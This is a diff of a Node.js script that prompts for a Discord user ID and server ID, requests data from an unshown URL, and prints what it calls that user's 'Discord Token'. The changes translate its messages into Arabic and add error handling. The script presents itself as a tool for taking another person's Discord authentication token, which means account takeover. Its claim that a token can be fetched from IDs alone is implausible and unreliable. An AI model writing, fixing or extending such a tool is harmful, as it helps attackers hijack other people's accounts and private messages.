@@ -14,34 +14,39 @@ async function getTokens(user_id, guild_id) {
     try {
         const response = await axios.get(url, { headers });
         if (response.status === 200) {
-            return response.data.user.token; // تحقق من وجود هذه القيمة في الرد
+            return response.data.user.token; // تأكد من وجود القيمة هنا
         } else {
-            console.log(`[-] Failed to fetch data. Status code: ${response.status}`);
+            console.log(`[-] فشل الحصول على البيانات. كود الحالة: ${response.status}`);
             return null;
         }
     } catch (error) {
-        console.error("Error fetching tokens:", error.message);
+        console.error("خطأ في جلب التوكنات:", error.message);
         return null;
     }
 }
 
 async function main() {
-    rl.question("Enter the user ID: ", (user_id) => {
-        rl.question("Enter the guild ID: ", async (guild_id) => {
-            try {
-                const token = await getTokens(user_id, guild_id);
-                if (token) {
-                    console.log(`[+] Discord Token: ${token}`);
-                } else {
-                    console.log("[-] Failed to get the token.");
+    try {
+        rl.question("أدخل ID المستخدم: ", (user_id) => {
+            rl.question("أدخل ID الخادم: ", async (guild_id) => {
+                try {
+                    const token = await getTokens(user_id, guild_id);
+                    if (token) {
+                        console.log(`[+] توكن ديسكورد: ${token}`);
+                    } else {
+                        console.log("[-] فشل الحصول على التوكن.");
+                    }
+                } catch (error) {
+                    console.log("[-] صار خطأ:", error);
+                } finally {
+                    rl.close();
                 }
-            } catch (error) {
-                console.log("[-] An error occurred:", error);
-            } finally {
-                rl.close();
-            }
+            });
         });
-    });
+    } catch (error) {
+        console.log("[-] صار خطأ في الدالة الرئيسية:", error);
+        rl.close();
+    }
 }
 
 main();
